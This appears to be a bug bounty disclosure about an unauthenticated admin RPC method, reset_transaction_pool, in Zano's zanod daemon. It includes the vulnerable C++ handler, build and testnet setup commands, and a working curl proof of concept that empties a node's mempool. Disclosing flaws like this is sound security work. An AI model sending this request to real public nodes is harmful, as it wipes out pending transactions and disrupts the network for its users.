# Unauthenticated Access to Zano Admin RPC Method

**Target:** https://github.com/hyle-team/zano/blob/master/src/rpc/core_rpc_server.cpp — Blockchain/DLT
**Impact:** Causing network processing nodes to process transactions from the mempool beyond set parameters

## Brief / Intro

I discovered that Zano's `zanod` daemon exposes a critical admin RPC method
`reset_transaction_pool` without any authentication. When the daemon is run with
`--rpc-enable-admin-api` and `--rpc-bind-ip=0.0.0.0`, any external user can trigger this method
via a single HTTP POST, with no token, header, or authentication checks. If exploited in
production, this would allow remote attackers to arbitrarily clear the mempool of any public node
running with that configuration — disrupting transaction propagation, delaying consensus, or
interfering with network behavior.

## Vulnerability Details

The vulnerability lies in the implementation of the `reset_transaction_pool` method:

```cpp
bool core_rpc_server::on_reset_transaction_pool(
    const COMMAND_RPC_RESET_TX_POOL::request& req,
    COMMAND_RPC_RESET_TX_POOL::response& res,
    connection_context& cntx)
{
    m_core.get_tx_pool().purge_transactions();
    res.status = API_RETURN_CODE_OK;
    return true;
}
```

The method directly calls `purge_transactions()` with no authentication layer, access control, or
validation of the requestor. It simply returns "OK" if the node was started with the
`--rpc-enable-admin-api` flag.

## Impact Details

This vulnerability allows a remote attacker to:

- Delete all pending transactions from the mempool on any exposed node
- Suppress valid user transactions by forcing repeated mempool resets
- Disrupt transaction propagation and potentially stall transaction confirmation for light wallet
  clients depending on that node
- Target public nodes, APIs, or infrastructure providers running with the admin API enabled

An attacker exploiting this could render any node's transaction pool empty and unstable, affecting
what gets mined or relayed.

## References

- Vulnerable code: https://github.com/hyle-team/zano/blob/master/src/rpc/core_rpc_server.cpp

## Proof of Concept

I demonstrated that `zanod` exposes `reset_transaction_pool` without authentication when started
with `--rpc-enable-admin-api` and bound to a public IP. An unauthenticated attacker can purge the
transaction pool on any vulnerable node. See [`POC__reset_tx_pool.sh`](./POC__reset_tx_pool.sh).

Setup:

```
git clone https://github.com/hyle-team/zano.git
cd zano
make -j$(nproc)

./build/release/src/zanod \
  --rpc-enable-admin-api \
  --rpc-bind-ip 0.0.0.0 \
  --rpc-bind-port 8071 \
  --testnet
```

Exploit (unauthenticated request):

```
curl -X POST http://127.0.0.1:8071/json_rpc \
  -H "Content-Type: application/json" \
  -d '{ "jsonrpc": "2.0", "id": "0", "method": "reset_transaction_pool", "params": {} }'
```

Output:

```json
{ "id": "0", "jsonrpc": "2.0", "result": { "status": "OK" } }
```

Proving: the RPC was called successfully; no authentication, token, or IP whitelisting was
required; the transaction pool was cleared.
